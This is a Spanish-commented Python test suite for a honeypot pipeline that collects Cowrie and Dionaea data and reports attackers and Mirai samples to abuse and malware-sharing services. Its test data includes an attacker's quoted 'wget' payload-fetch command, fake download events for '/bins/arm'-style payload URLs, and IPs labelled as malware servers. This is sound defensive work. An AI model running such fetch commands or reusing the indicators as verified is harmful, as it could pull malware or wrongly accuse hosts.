    mas3 = _tz(_td(hours=3))

    R.igual("una 'Z' mentirosa se corrige al huso configurado",
            parse_timestamp("2026-08-19T19:11:49Z", mas3).isoformat(),
            "2026-08-19T16:11:49+00:00")
    R.igual("y una marca sin huso, igual",
            parse_timestamp("2026-08-19T19:11:49", mas3).isoformat(),
            "2026-08-19T16:11:49+00:00")
    # Esta si dice la verdad, y por eso no se toca: reinterpretarla la
    # desplazaria otras tres horas.
    R.igual("un desfase numerico explicito se respeta",
            parse_timestamp("2026-08-19T19:11:49+03:00", mas3).isoformat(),
            "2026-08-19T16:11:49+00:00")
    R.igual("con el huso por defecto (UTC) no cambia nada",
            parse_timestamp("2026-08-19T16:11:49Z").isoformat(),
            "2026-08-19T16:11:49+00:00")
    R.check("una fecha ilegible devuelve None, no revienta",
            parse_timestamp("no es una fecha", mas3) is None)
    R.igual("un huso desconocido cae a UTC en vez de abortar",
            resolver_huso("No/Existe"), _tz.utc)

    # El huso no se cree, se comprueba contra el propio log: el sistema de
    # ficheros fecha el cowrie.json en tiempo real, y la ultima linea se
    # escribio en ese instante. Si al convertirla no sale esa hora, el huso
    # esta mal. Funciona en cualquier pais: no compara con la hora del
    # servidor, compara el log consigo mismo.
    import os as _os
    from collectors.cowrie import comprobar_huso
    dlog = d / "cowrielog"
    dlog.mkdir(exist_ok=True)
    escrito = datetime(2026, 8, 19, 16, 0, 0, tzinfo=timezone.utc)

    bien = dlog / "cowrie.json"
    plantilla = '{"eventid":"x","timestamp":"2026-08-19T%s:00:00.000000Z"}' + chr(10)
    bien.write_text(plantilla % "16", encoding="utf-8")
    _os.utime(bien, (escrito.timestamp(), escrito.timestamp()))
    R.igual("con el huso correcto no se queja",
            comprobar_huso(dlog, "cowrie.json*", "UTC"), None)

    # Misma hora de escritura, pero la linea dice tres horas mas: es
    # exactamente el fallo que tuvimos, con la "Z" mintiendo.
    bien.write_text(plantilla % "19", encoding="utf-8")
    _os.utime(bien, (escrito.timestamp(), escrito.timestamp()))
    aviso = comprobar_huso(dlog, "cowrie.json*", "UTC")
    R.check("y con el huso mal lo detecta", aviso is not None)
    R.check("diciendo de cuanto es el desfase", aviso and "+3.0 h" in aviso)

    # ------------------------------------------------- simulado != enviado
    #
    # Un envio simulado se apunta en `sent` con estado "simulado" para que la
    # simulacion ensene la deduplicacion de verdad. Lo que no puede hacer es
    # bloquear el envio real de despues: si lo hiciera, el modo recomendado
    # ---simular unos dias y luego pasar a --live--- garantizaria que no se
    # publica nada nunca, y sin un solo mensaje de error.
    R.seccion("Un envio simulado no bloquea el real")

    # En diferencias, porque las pruebas anteriores ya han dejado subidas
    # simuladas de MalwareBazaar en el estado.
    real_antes = estado.quota_used("malwarebazaar")
    todo_antes = estado.quota_used("malwarebazaar", contar_simulados=True)

    estado.commit_send("malwarebazaar", "upload:deadbeef", "simulado")
    R.check("en simulacion, el simulado si cuenta como enviado",
            estado.already_sent("malwarebazaar", "upload:deadbeef",
                                contar_simulados=True))
    R.check("en real, el simulado NO cuenta",
            not estado.already_sent("malwarebazaar", "upload:deadbeef",
                                    contar_simulados=False))

    estado.commit_send("malwarebazaar", "upload:cafe", "enviado")
    R.check("y un envio de verdad si bloquea",
            estado.already_sent("malwarebazaar", "upload:cafe",
                                contar_simulados=False))

    # La cuota real tampoco se gasta simulando: son los topes de 5 al dia y
    # 20 a la semana de MalwareBazaar los que estarian en juego.
    R.igual("la cuota real solo sube por el envio de verdad",
            estado.quota_used("malwarebazaar") - real_antes, 1)
    R.igual("y la simulacion ve los dos",
            estado.quota_used("malwarebazaar", contar_simulados=True) - todo_antes, 2)

    estado.commit_send("abuseipdb", "9.9.9.9@2026-01-01", "simulado")
    R.check("el enfriamiento de AbuseIPDB ignora el simulado en real",
            estado.last_sent_at("abuseipdb", "9.9.9.9@%",
                                contar_simulados=False) is None)
    R.check("y lo respeta en simulacion",
            estado.last_sent_at("abuseipdb", "9.9.9.9@%",
                                contar_simulados=True) is not None)

    # ------------------------------------------------------------- purga
    #
    # La tabla de rechazos crece unas 6000 filas al dia: la misma IP en
    # enfriamiento deja una cada quince minutos diciendo lo mismo. Hay que
    # poder tirarla. Lo que NO se puede tirar es la memoria que impide subir
    # dos veces la misma muestra, que es exactamente lo que costo un baneo.
    R.seccion("La purga limpia el ruido y respeta la memoria")

    viejo = (datetime.now(timezone.utc) - timedelta(days=90)).isoformat()
    estado.db.execute(
        "INSERT INTO sent (platform, key, status, sent_at, detail)"
        " VALUES ('malwarebazaar','upload:hashviejo','enviado',?,'')", (viejo,))
    estado.db.execute(
        "INSERT INTO sent (platform, key, status, sent_at, detail)"
        " VALUES ('abuseipdb','9.9.9.9@2020-01-01','enviado',?,'')", (viejo,))
    estado.db.execute(
        "INSERT INTO rejections (ts, platform, key, gate, reason)"
        " VALUES (?,'abuseipdb','1.2.3.4','enfriamiento','ruido')", (viejo,))
    estado.db.commit()

    antes_recientes = len(estado.recent_rejections(500))
    borrado = estado.purge(dias=30)

    R.check("una subida identificada por hash sobrevive para siempre",
            estado.already_sent("malwarebazaar", "upload:hashviejo",
                                contar_simulados=False))
    R.check("una denuncia de IP antigua si se retira",
            not estado.already_sent("abuseipdb", "9.9.9.9@2020-01-01"))
    R.igual("con retention_days = 0 la purga no hace nada",
            estado.purge(dias=0), {})
    R.check("y el ruido de auditoria se va",
            borrado["rejections"] >= 1
            and len(estado.recent_rejections(500)) < antes_recientes)

    # -------------------------------------------- la lista para el plugin
    #
    # El plugin de Cowrie corre DENTRO del contenedor y necesita saber que IP
    # somos nosotros; sin eso, el boton rojo ofrece banear nuestro propio
    # nodo de VPN. No se resuelve montando el config.ini ahi dentro: lleva las
    # tres claves de API. Se publica solo la lista.
    R.seccion("La lista de IP propias sale sin ningun secreto")

    from orchestrator import publicar_ips_propias
    salida = d / "propias" / "ips-propias.txt"
    salida.parent.mkdir(exist_ok=True)
    cfg.section("paths")["ips_propias_out"] = str(salida)
    publicar_ips_propias(cfg, log.get("prueba"))

    contenido = salida.read_text(encoding="utf-8")
    R.check("la IP de la blocklist esta en el fichero", "203.0.113.7" in contenido)
    for secreto in ("CLAVE_FALSA_VT_0123456789", "CLAVE_FALSA_MB_0123456789",
                    "CLAVE_FALSA_AB_0123456789", "CLAVE_FALSA_UH_0123456789",
                    "CLAVE_FALSA_TF_0123456789"):
        R.check(f"y NO se cuela {secreto[:14]}...", secreto not in contenido)
    R.check("avisa de que no se edite a mano", "NO editar a mano" in contenido)

    # Si no existe el directorio --- una maquina sin la parte de Telegram ---
    # no es un error, simplemente no hay nada que publicar.
    cfg.section("paths")["ips_propias_out"] = str(d / "no" / "existe" / "x.txt")
    publicar_ips_propias(cfg, log.get("prueba"))
    R.check("sin directorio de destino no revienta", True)

    # --------------------------------- el motivo del descarte no puede mentir
    R.seccion("Las URL con IP privada NO entran en la tuberia")
    # 192.168.1.1:8088/i es Mirai tanteando la puerta de enlace de la LAN de la
    # victima. Antes entraba, recorria media tuberia y solo se paraba en la
    # BARRERA, la ultima linea antes del POST. Ahora se descarta al recogerla.
    # La barrera sigue estando de red final, pero no debe ser la unica.
    from collectors.cowrie import _url_de_ip_privada as _uip
    _g2 = ipguard.IPGuard(["198.51.100.146"])
    for _u2, _priv in (("http://192.168.1.1:8088/i", True),
                       ("http://10.0.0.5/x", True),
                       ("http://127.0.0.1/x", True),
                       ("http://224.0.0.1/x", True),
                       ("http://198.51.100.146/x", True),   # una nuestra
                       ("http://5.182.210.174/mirai.arm", False),  # C2 publico
                       ("http://upx.sf.net/x", False)):    # dominio, decide luego
        R.igual(f"{_u2[:34]} {'se filtra' if _priv else 'pasa'}",
                _uip(_u2, _g2), _priv)

    # Y el reporte de distribucion tampoco construye nada para una IP privada.
    from orchestrator import _distribuidor_de as _dd
    def _ms(url):
        return _S(sha256="d7" + "0" * 62, path=Path("/x"), size=10,
                  source="cowrie", seen_at=AHORA, download_url=url)
    R.igual("no se denuncia como distribuidor a una IP privada", None,
            _dd(_ms("http://192.168.1.1/x"), {"malicious": 41}, "mirai"))
    R.check("   pero si a un C2 publico",
            _dd(_ms("http://5.182.210.174/x"), {"malicious": 41}, "mirai") is not None)

    R.seccion("La barrera tapa las multicast, que is_global daba por buenas")
    # Encontrado auditando el reporte de servidores de distribucion: el host
    # sale de una URL que TECLEA EL ATACANTE, asi que `wget http://224.0.0.1/x`
    # bastaba para publicar una denuncia absurda. `ip.is_global` devuelve True
    # para multicast, en IPv4 y en IPv6, y la cabecera del propio ipguard
    # afirmaba lo contrario.
    _g = ipguard.IPGuard(["198.51.100.146", "192.0.2.190"])
    for _ip, _esperado in (("224.0.0.1", False), ("239.255.255.250", False),
                           ("ff02::1", False), ("0.0.0.0", False),
                           ("::", False), ("255.255.255.255", False),
                           ("5.182.210.174", True),
                           ("2606:4700:4700::1111", True)):
        R.igual(f"{_ip} {'se puede denunciar' if _esperado else 'NO se denuncia'}",
                _g.is_reportable(_ip), _esperado)

    R.seccion("Tambien se denuncia el servidor que SIRVE el binario")
    # En un ataque de Mirai hay dos maquinas malas: la que entra al senuelo y
    # la que le sirve el payload. La segunda solo salia como IOC en ThreatFox.
    #
    # La evidencia es de otra naturaleza y por eso el liston es otro: de un
    # atacante tenemos su apreton de manos, de un servidor de descargas no
    # tenemos ninguna conexion entrante. Lo unico que acredita es haberle
    # bajado un fichero Y que VirusTotal lo confirme.
    from orchestrator import _distribuidor_de
    from common.model import HostDistribucion
    from reporters.abuseipdb import CAT_EXPLOITED_HOST

    def _m(url):
        return _S(sha256="d7" + "0" * 62, path=Path("/x"), size=10,
                  source="cowrie", seen_at=AHORA, download_url=url)

    R.check("una URL con IP literal si acredita al servidor",
            _distribuidor_de(_m("http://5.182.210.174:45262/i"),
                             {"malicious": 41}, "mirai") is not None)
    R.igual("   y se queda con la IP y el puerto observados",
            ("5.182.210.174", 45262),
            (lambda h: (h.ip, h.puerto))(
                _distribuidor_de(_m("http://5.182.210.174:45262/i"),
                                 {"malicious": 41}, "mirai")))
    R.igual("un DOMINIO no se denuncia: su IP la resuelve el DNS y cambia",
            None, _distribuidor_de(_m("http://malo.example.com/x.sh"),
                                   {"malicious": 41}, "mirai"))
    R.igual("sin URL (subida por SCP) no hay a quien denunciar",
            None, _distribuidor_de(_m(None), {"malicious": 41}, "mirai"))

    _h = HostDistribucion(
        ip="5.182.210.174", url="http://5.182.210.174:45262/i",
        sha256="d7" + "0" * 62, seen_at=AHORA, source="cowrie",
        familia="mirai", motores=41, puerto=45262)

    R.igual("la categoria es la 20, y solo esa", 20, CAT_EXPLOITED_HOST)
    _txt = ab.comment_distribucion(_h)
    R.check("el comentario dice de QUE se le acusa",
            "hosting malicious content" in _txt)
    R.check("   aclara que NO se le denuncia por atacarnos",
            "not for connecting to us" in _txt)
    R.check("   lleva la prueba: el hash y cuantos motores",
            _h.sha256 in _txt and "41 engines" in _txt)
    R.check("   y NO copia la ruta de la URL, que la elige el atacante",
            "45262/i" not in _txt)

    # Las dos puertas: sin muestra y sin veredicto no se denuncia a nadie.
    ab.motivos.clear()
    _sin = HostDistribucion(ip="1.2.3.4", url="http://1.2.3.4/x", sha256="",
                            seen_at=AHORA, source="cowrie", motores=41)
    R.igual("sin muestra capturada NO se denuncia", False,
            ab.report_distribucion(_sin))
    _sinvt = HostDistribucion(ip="1.2.3.4", url="http://1.2.3.4/x",
                              sha256="d7" + "0" * 62, seen_at=AHORA,
                              source="cowrie", motores=0)
    R.igual("sin veredicto de VirusTotal tampoco", False,
            ab.report_distribucion(_sinvt))

    R.seccion("Lo que SUBEN por SFTP/SCP tambien se recoge")
    # El evento cowrie.session.file_upload estaba solo en SESSION_EVENTS ---o
    # sea, servia para acreditar que hubo sesion--- y su shasum no entraba en
    # la cola de muestras. El binario quedaba en disco y no llegaba ni a
    # VirusTotal ni a MalwareBazaar: se perdia la muestra, que es el motivo de
    # existir del senuelo.
    import hashlib as _hl
    import json as _js
    from collectors import cowrie as _cc

    _tmp = Path(tempfile.mkdtemp())
    (_tmp / "log").mkdir(); (_tmp / "dl").mkdir()
    _cuerpos = {"sftp": b"ELF por sftp", "scp": b"ELF por scp", "dl": b"ELF bajado"}
    _sha = {k: _hl.sha256(v).hexdigest() for k, v in _cuerpos.items()}
    for _k, _v in _cuerpos.items():
        (_tmp / "dl" / _sha[_k]).write_bytes(_v)

    # LAS MARCAS DE TIEMPO VAN RELATIVAS A AHORA, no escritas a mano. Con
    # fechas fijas el test caduca solo: el colector solo mira las ultimas 24 h,
    # asi que una fecha puesta hoy deja de entrar en la ventana manana y la
    # prueba empieza a fallar sin que nadie haya tocado el codigo. Paso el
    # 2026-08-23.
    _t0 = AHORA - timedelta(hours=1)

    def _marca(seg):
        return (_t0 + timedelta(seconds=seg)).strftime("%Y-%m-%dT%H:%M:%S.0Z")

    def _ev(ts, eid, **kw):
        return dict(timestamp=ts, eventid=eid, src_ip="203.0.113.55",
                    session="s1", **kw)

    _lineas = [
        _ev(_marca(0), "cowrie.session.connect"),
        # SFTP no trae campo url
        _ev(_marca(1), "cowrie.session.file_upload",
            filename="x", shasum=_sha["sftp"]),
        # SCP SI trae url, pero es la ruta de destino DENTRO del senuelo:
        # tomarla por origen del payload seria inventarse un indicador.
        _ev(_marca(2), "cowrie.session.file_upload",
            filename="y", url="/tmp/.hidden/y", shasum=_sha["scp"]),
        _ev(_marca(3), "cowrie.session.file_download",
            url="http://198.51.100.9:8080/bins/arm", shasum=_sha["dl"]),
    ]
    (_tmp / "log" / "cowrie.json").write_text(
        "\n".join(_js.dumps(x) for x in _lineas) + "\n", encoding="utf-8")

    class _GuardTodo:
        def check(self, ip):
            return True, ""

        def is_reportable(self, ip):
            return self.check(ip)[0]

    _a, _s, _u = _cc.collect(_tmp / "log", "cowrie.json*", _tmp / "dl",
                             _GuardTodo(), 24, "UTC")
    _por_sha = {x.sha256: x for x in _s}
    R.igual("se recogen las TRES muestras, no solo la descargada", len(_s), 3)
    R.check("la subida por SFTP llega al reporter", _sha["sftp"] in _por_sha)
    R.check("   y la subida por SCP tambien", _sha["scp"] in _por_sha)
    R.igual("una subida NO inventa una URL de origen", None,
            _por_sha[_sha["sftp"]].download_url)
    R.igual("   y la ruta local que manda SCP tampoco se toma por URL", None,
            _por_sha[_sha["scp"]].download_url)
    R.igual("la descarga si conserva la suya",
            "http://198.51.100.9:8080/bins/arm",
            _por_sha[_sha["dl"]].download_url)
    R.igual("y a URLhaus solo va la URL de verdad",
            ["http://198.51.100.9:8080/bins/arm"], [x.url for x in _u])

    R.seccion("Una URL con binario capturado NO se anota como 'sin muestra'")
    # Caso real: 42.177.102.201:45262 servia el MISMO payload en /bin.sh y en
    # /i. El colector le da la muestra a la primera URL que vio, y la segunda
    # caia en el anotador con el motivo "no se llego a capturar el binario"
    # ---falso: se capturo cinco veces, con su hash---.
    from orchestrator import anotar_urls_sin_muestra
    from common.model import PayloadURL as _PU2

    SHA_C = "f6c97b1e2ed02578ca1066c8235ba4f991e645f89012406c639dbccc6582eec8"
    _urls2 = [
        _PU2(url="http://1.2.3.4:45262/bin.sh", source="cowrie", seen_at=AHORA,
             sha256=SHA_C),
        _PU2(url="http://1.2.3.4:45262/i", source="cowrie", seen_at=AHORA,
             sha256=SHA_C),
        _PU2(url="http://upx.sf.net", source="cowrie", seen_at=AHORA),
    ]
    _muestras2 = [Sample(sha256=SHA_C, path=Path("/x"), size=1, source="cowrie",
                         seen_at=AHORA, download_url="http://1.2.3.4:45262/bin.sh")]

    uh.motivos.clear()
    anotar_urls_sin_muestra(uh, _urls2, _muestras2)
    motivos = {f["key"]: (f["gate"], f["reason"])
               for f in estado.recent_rejections(200)
               if f["platform"] == "urlhaus"}

    R.igual("la URL que llevaba la muestra no se anota", None,
            motivos.get("http://1.2.3.4:45262/bin.sh"))
    R.igual("la del mismo hash se anota como muestra compartida",
            "muestra-compartida", motivos.get("http://1.2.3.4:45262/i", ("",))[0])
    R.check("   y su motivo NO dice que no se capturara",
            "no se llego a capturar" not in motivos.get("http://1.2.3.4:45262/i", ("",""))[1])
    R.igual("la que de verdad no tiene binario sigue como sin-muestra",
            "sin-muestra", motivos.get("http://upx.sf.net", ("",))[0])

    # ------------------------------------------- una IP, un solo informe
    R.seccion("Una IP vista por los DOS honeypots se denuncia entera")
    # El caso real: la misma IP fuerza SSH en Cowrie y toca el 445 en
    # Dionaea. Cada collector la agrupa por su cuenta, asi que llegan dos
    # AttackerIP con la mitad de la evidencia cada uno. Si no se fusionan, se
    # denuncia una mitad ---nombrando un solo servicio--- y la otra la mata la
    # ventana de enfriamiento tomandola por duplicado.
    from orchestrator import _fusionar_atacantes

    partido = [
        AttackerIP(ip="203.0.113.9", source="cowrie",
                   first_seen=AHORA - timedelta(hours=2), last_seen=AHORA - timedelta(hours=1),
                   handshake_ok=True, login_failures=40, commands=2,
                   ports={22}, protocols={"ssh"}),
        AttackerIP(ip="203.0.113.9", source="dionaea",
                   first_seen=AHORA - timedelta(hours=3), last_seen=AHORA,
                   handshake_ok=True, ports={445, 1433}, protocols={"smbd"}),
        AttackerIP(ip="198.51.100.7", source="cowrie",
                   first_seen=AHORA, last_seen=AHORA,
                   handshake_ok=True, login_failures=3, ports={23}),
    ]
    unidas = _fusionar_atacantes(partido, log.get("test"))
    R.igual("las dos mitades quedan en una sola IP", len(unidas), 2)

    junta = [a for a in unidas if a.ip == "203.0.113.9"][0]
    R.igual("suma los puertos de los dos honeypots", junta.ports, {22, 445, 1433})
    R.igual("conserva los contadores de la mitad de Cowrie", junta.login_failures, 40)
    R.igual("se queda el primer avistamiento de las dos",
            junta.first_seen, AHORA - timedelta(hours=3))
    R.igual("y el ultimo", junta.last_seen, AHORA)
    R.igual("junta los protocolos", junta.protocols, {"ssh", "smbd"})

    # Lo que de verdad importa: lo que se acaba PUBLICANDO.
    R.igual("la denuncia nombra los tres servicios, no uno",
            AbuseIPDB._servicio(junta), "SSH/SMB/MSSQL")
    R.check("tres puertos distintos disparan la categoria de escaneo",
            14 in ab.categories(junta))
    R.igual("la IP que solo vio un honeypot no se toca",
            [a for a in unidas if a.ip == "198.51.100.7"][0].ports, {23})

    # ---------------------------------------------------------------- red
    R.seccion("En simulacion no sale ni una publicacion")
    escrituras = [(m, u) for m, u in LLAMADAS
                  if m == "POST" and "mb-api" not in u]
    R.igual("ninguna peticion de escritura llego a la red", escrituras, [])

    # ------------------------------------------------------------------
    # Reintentar lo que PUBLICA es como se duplica una denuncia
    # ------------------------------------------------------------------
    #
    # El 2026-08-28 salio una denuncia repetida a AbuseIPDB, que contesto "You
    # can only report the same IP once in 15 minutes": la primera habia
    # entrado y el reintento la volvio a mandar. Un timeout o un 500 no dicen
    # "no llego", dicen "no se sabe"; el servidor pudo procesarla y caerse al
    # contestar. Y publicar por duplicado es justo lo que estas plataformas
    # penalizan.
    R.seccion("Lo que publica no se reintenta a ciegas")

    class SesionQueFalla:
        """Doble del transporte: cuenta intentos y hace lo que se le pida."""

        def __init__(self, comportamiento):
            self.comportamiento = comportamiento
            self.intentos = 0
            self.headers: dict = {}

        def request(self, metodo, url, **kw):
            self.intentos += 1
            if self.comportamiento == "red":
                raise http_mod.requests.RequestException("se corto")
            return harness.Respuesta(self.comportamiento, {"x": 1})

    def probar(comportamiento, crea):
        cliente = HttpClient(estado, timeout=1, dry_run=False)
        cliente.session = SesionQueFalla(comportamiento)
        r = cliente.request("abuseipdb", "POST", "https://ejemplo/x",
                            crea_recurso=crea)
        return cliente.session.intentos, r

    intentos, r = probar(500, crea=False)
    R.igual("una LECTURA con 500 se reintenta las cuatro veces", intentos, 4)
    R.check("y no se marca como incierta", not r.incierto)

    intentos, r = probar(500, crea=True)
    R.igual("una PUBLICACION con 500 se manda una sola vez", intentos, 1)
    R.check("y vuelve marcada como incierta", r.incierto)

    intentos, r = probar("red", crea=False)
    R.igual("una LECTURA que se corta se reintenta", intentos, 4)
    R.check("y tampoco se marca", not r.incierto)

    intentos, r = probar("red", crea=True)
    R.igual("una PUBLICACION que se corta se manda una sola vez", intentos, 1)
    R.check("y vuelve marcada como incierta", r.incierto)

    # El 429 SI se sigue reintentando aunque publique: se emite ANTES de
    # procesar, asi que no se ha creado nada y repetir es seguro.
    intentos, r = probar(429, crea=True)
    R.igual("un 429 se reintenta aunque la peticion publique", intentos, 4)
    R.check("y no queda incierta, porque no llego a crear nada", not r.incierto)

    # ---- Y que send() sepa que hacer con eso -------------------------------
    #
    # Ni exito ni rechazo. Las dos salidas normales hacen dano: darlo por
    # bueno pierde el envio, darlo por fallido lo reenvia y lo duplica.
    clave_dudosa = "1.2.3.4@dudosa"
    cliente = HttpClient(estado, timeout=1, dry_run=False)
    cliente.session = SesionQueFalla(500)
    ab_dudoso = AbuseIPDB(cfg.section("abuseipdb"), cliente, estado, guard)
    antes_rechazos = estado.count_rejections(("abuseipdb",), "rechazo-plataforma", 24)
    resp = ab_dudoso.send(
        clave_dudosa,
        lambda: cliente.request("abuseipdb", "POST", "https://ejemplo/x",
                                crea_recurso=True))
    R.check("la respuesta llega marcada", bool(resp and resp.incierto))
    # LA FILA SE QUEDA EN INFLIGHT. Es para lo que existe esa tabla: sin ella
    # no queda constancia de que hay algo por aclarar, y resolve_orphans no
    # tiene a que preguntarle.
    en_vuelo = [f["key"] for f in estado.orphans("abuseipdb")]
    R.check("la intencion NO se retira: se queda en inflight",
            clave_dudosa in en_vuelo)
    R.check("no cuenta como rechazo de la plataforma",
            estado.count_rejections(("abuseipdb",), "rechazo-plataforma", 24)
            == antes_rechazos)
    R.check("sino con motivo propio",
            estado.count_rejections(("abuseipdb",), "resultado-incierto", 24) >= 1)
    R.check("y no se da por enviada",
            not estado.already_sent("abuseipdb", clave_dudosa))

    # ---- Y LA PASADA SIGUIENTE NO LA REENVIA -------------------------------
    #
    # Aqui estaba el agujero de verdad, y es sutil: marcar el resultado como
    # incierto no basta. Como no se anota en `sent`, el enfriamiento no tiene
    # de que agarrarse, y sin esta comprobacion la pasada siguiente vuelve a
    # publicar lo mismo --- o sea, se cambia un duplicado por otro. Es
    # exactamente lo que paso el 2026-08-27 con 103.29.185.162: dos denuncias
    # en catorce minutos.
    cliente2 = HttpClient(estado, timeout=1, dry_run=False)
    cliente2.session = SesionQueFalla(200)
    ab_segunda = AbuseIPDB(cfg.section("abuseipdb"), cliente2, estado, guard)
    segunda = ab_segunda.send(
        clave_dudosa,
        lambda: cliente2.request("abuseipdb", "POST", "https://ejemplo/x",
                                 crea_recurso=True))
    R.check("la pasada siguiente NO la vuelve a mandar", segunda is None)
    R.igual("y no se abre ni un socket", cliente2.session.intentos, 0)
    R.check("queda anotado por que no salio",
            estado.count_rejections(("abuseipdb",), "resultado-incierto", 24) >= 2)

    # Una clave distinta no se ve afectada: el bloqueo es de lo que quedo en
    # el aire, no de la plataforma entera.
    cliente3 = HttpClient(estado, timeout=1, dry_run=False)
    cliente3.session = SesionQueFalla(200)
    ab_otra = AbuseIPDB(cfg.section("abuseipdb"), cliente3, estado, guard)
    otra = ab_otra.send(
        "9.9.9.9@otra",
        lambda: cliente3.request("abuseipdb", "POST", "https://ejemplo/x",
                                 crea_recurso=True))
    R.check("otra clave distinta si sale", bool(otra and otra.ok))

    # ------------------------------------------------------------------
    # Resolver lo que quedo en vuelo, en vez de dejarlo ahi para siempre
    # ------------------------------------------------------------------
    #
    # Desde que un resultado incierto BLOQUEA el reenvio, dejar la fila en
    # vuelo ya no es gratis: esa clave no vuelve a salir hasta que alguien la
    # resuelva. Antes solo MalwareBazaar sabia preguntar.
    R.seccion("Los envios que quedaron sin respuesta")

    class SesionQueContesta:
        """Devuelve lo que se le diga, mirando la URL de la peticion."""

        def __init__(self, respuestas):
            self.respuestas = respuestas
            self.headers: dict = {}
            self.vistas: list[str] = []

        def request(self, metodo, url, **kw):
            self.vistas.append(url)
            for trozo, (status, cuerpo) in self.respuestas.items():
                if trozo in url:
                    return harness.Respuesta(status, cuerpo)
            return harness.Respuesta(404, None)

    def con_huerfano(clase, seccion, clave, respuestas):
        """Deja una fila en vuelo y ejecuta resolve_orphans() sobre ella."""
        cli = HttpClient(estado, timeout=1, dry_run=False)
        cli.session = SesionQueContesta(respuestas)
        rep = clase(cfg.section(seccion), cli, estado, guard)
        estado.begin_send(seccion, clave)
        rep.resolve_orphans()
        return cli

    # ---- ThreatFox: search_ioc lo dice, y se decide en los dos sentidos ----
    tf_clave = "ip:port:203.0.113.55:443"
    con_huerfano(ThreatFox, "threatfox", tf_clave,
                 {"threatfox": (200, {"query_status": "ok",
                                      "data": [{"ioc": "203.0.113.55:443"}]})})
    R.check("un IOC que SI esta se da por enviado",
            estado.already_sent("threatfox", tf_clave))
    R.check("y deja de estar en vuelo",
            estado.en_vuelo("threatfox", tf_clave) is None)

    tf_clave2 = "ip:port:203.0.113.56:443"
    con_huerfano(ThreatFox, "threatfox", tf_clave2,
                 {"threatfox": (200, {"query_status": "no_result"})})
    R.check("uno que NO esta se libera para reintentarlo",
            estado.en_vuelo("threatfox", tf_clave2) is None)
    R.check("y no se da por enviado",
            not estado.already_sent("threatfox", tf_clave2))

    # UNA RESPUESTA QUE NO SE ENTIENDE NO DECIDE NADA. Abortar por algo que no
    # se entiende reenviaria lo que si pudo entrar.
    tf_clave3 = "ip:port:203.0.113.57:443"
    con_huerfano(ThreatFox, "threatfox", tf_clave3,
                 {"threatfox": (500, None)})
    R.check("si la consulta falla, se queda en vuelo",
            estado.en_vuelo("threatfox", tf_clave3) is not None)

    # La clave lleva el tipo delante, y el tipo tiene ":" dentro.
    R.igual("el indicador se saca por el tipo, no por el primer ':'",
            ThreatFox._ioc_de_clave("ip:port:1.2.3.4:80"), "1.2.3.4:80")
    R.igual("y con un dominio, igual",
            ThreatFox._ioc_de_clave("domain:malo.example"), "malo.example")

    # ---- VirusTotal: las subidas si, los comentarios no --------------------
    #
    # SIN CUOTA NO SE DECIDE NADA. A estas alturas la suite ya ha gastado la
    # de VirusTotal, asi que este es el caso real ---y el correcto---: no se
    # puede preguntar, luego no se toca. Adivinar aqui reenviaria una muestra
    # que quiza ya esta subida.
    sha_h = "b" * 64
    con_huerfano(VirusTotal, "virustotal", f"upload:{sha_h}",
                 {f"/files/{sha_h}": (200, {"data": {"attributes": {}}})})
    R.check("sin cuota para consultar, el huerfano se queda en vuelo",
            estado.en_vuelo("virustotal", f"upload:{sha_h}") is not None)

    # Y con cuota, decide en los dos sentidos. Se libera la del dia para
    # poder probarlo: es lo unico que separa un caso del otro.
    #
    # Se borra de api_calls y no de quota, y la diferencia importa: el tope
    # diario de VirusTotal cuenta LLAMADAS ---las consultas de hash incluidas,
    # que son la mayoria--- y no publicaciones. Mirando quota, esto seguiria
    # sin cuota y la prueba diria que el codigo no decide cuando el problema
    # seria la tabla equivocada.
    estado.db.execute("DELETE FROM api_calls WHERE platform='virustotal'")
    estado.db.commit()

    con_huerfano(VirusTotal, "virustotal", f"upload:{sha_h}",
                 {f"/files/{sha_h}": (200, {"data": {"attributes": {}}})})
    R.check("una subida que VirusTotal ya tiene se da por enviada",
            estado.already_sent("virustotal", f"upload:{sha_h}"))

    sha_i = "c" * 64
    con_huerfano(VirusTotal, "virustotal", f"upload:{sha_i}",
                 {f"/files/{sha_i}": (404, None)})
    R.check("una que no tiene se libera para reintentarla",
            estado.en_vuelo("virustotal", f"upload:{sha_i}") is None)

    # Un comentario no se puede comprobar barato, y equivocarse dejaria uno
    # repetido en una muestra ajena: se queda en vuelo a proposito.
    con_huerfano(VirusTotal, "virustotal", f"comment:{sha_h}", {})
    R.check("un comentario huerfano NO se toca",
            estado.en_vuelo("virustotal", f"comment:{sha_h}") is not None)

    # ---- URLhaus: solo actua si dice que SI --------------------------------
    #
    # Nunca hemos usado su API. Un "no lo tengo" equivocado ---porque la URL
    # aun no se vea--- nos haria reenviarla, o sea publicar dos veces.
    uh_ok = "http://198.51.100.9/a.sh"
    con_huerfano(URLhaus, "urlhaus", uh_ok,
                 {"urlhaus-api": (200, {"query_status": "ok"})})
    R.check("una URL que URLhaus ya tiene se da por enviada",
            estado.already_sent("urlhaus", uh_ok))

    uh_no = "http://198.51.100.10/b.sh"
    con_huerfano(URLhaus, "urlhaus", uh_no,
                 {"urlhaus-api": (200, {"query_status": "no_results"})})
    R.check("pero un 'no_results' NO la libera, que reenviarla la duplicaria",
            estado.en_vuelo("urlhaus", uh_no) is not None)

    # ---- AbuseIPDB: no consulta, y no hace falta ---------------------------
    #
    # La clave lleva la fecha, asi que dejarla en vuelo se comporta igual que
    # el enfriamiento de 24 h: hoy no se repite, manana la clave es otra.
    ab_clave = "203.0.113.60@2026-08-29"
    cli_ab = con_huerfano(AbuseIPDB, "abuseipdb", ab_clave, {})
    R.igual("no gasta ni una consulta de la cuota de denuncias",
            cli_ab.session.vistas, [])
    R.check("y la deja en vuelo, que es lo que toca ese dia",
            estado.en_vuelo("abuseipdb", ab_clave) is not None)

    # UNA linea por pasada, no una por huerfano. AbuseIPDB acumula decenas
    # ---cada corte de red deja uno y el purgado los guarda un mes--- y esto
    # corre cada 15 min: una por fila eran miles de lineas al dia, y eran las
    # que llenaban el log y lo hacian rotar tres veces al dia.
    import logging as _logging
    _capt: list = []

    class _Cap(_logging.Handler):
        def emit(self, rec):
            _capt.append((rec.levelno, rec.getMessage()))

    _lg = _logging.getLogger("dirtyland.reporter.abuseipdb")
    _h = _Cap(); _lg.addHandler(_h); _niv = _lg.level; _lg.setLevel(_logging.WARNING)
    for i in range(6):
        estado.begin_send("abuseipdb", "10.0.0.%d@2026-08-29" % i)
    _n = len(estado.orphans("abuseipdb"))
    _rep = AbuseIPDB(cfg.section("abuseipdb"),
                     HttpClient(estado, timeout=1, dry_run=False), estado, guard)
    _rep.resolve_orphans()
    _lg.removeHandler(_h); _lg.setLevel(_niv)
